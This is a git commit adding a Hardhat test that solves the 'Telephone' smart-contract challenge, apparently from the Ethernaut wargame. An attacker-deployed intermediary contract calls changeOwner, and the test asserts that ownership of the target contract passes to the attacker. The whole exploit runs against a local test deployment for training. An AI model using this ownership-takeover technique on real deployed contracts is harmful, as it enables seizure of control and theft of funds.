2531e3ece69294b19aaacd801c7297f36991410a
grzeznx2 <grzeznx2@gmail.com>
2023-01-06 10:01:41 +0100

    Solve Telephone challenge

---
+++ test/Telephone.spec.ts
@@ -0,0 +1,22 @@
+import { expect } from "chai";
+import { ethers } from "hardhat";
+
+const { utils } = ethers;
+
+describe("Telephone", () => {
+  it.only("Solves the challenge", async () => {
+    const [deployer, attacker] = await ethers.getSigners()
+    const telephoneContractFactory = await ethers.getContractFactory("Telephone")
+    const telephoneContract = await telephoneContractFactory.connect(deployer).deploy()
+    await telephoneContract.deployed()
+
+    const middlewareContractFactory = await ethers.getContractFactory("Middleware")
+    const middlewareContract = await middlewareContractFactory.connect(attacker).deploy(telephoneContract.address)
+    await middlewareContract.deployed()
+
+    const tx = await middlewareContract.connect(attacker).changeOwner()
+    await tx.wait()
+
+    expect(await telephoneContract.owner()).to.eq(attacker.address)
+  });
+});
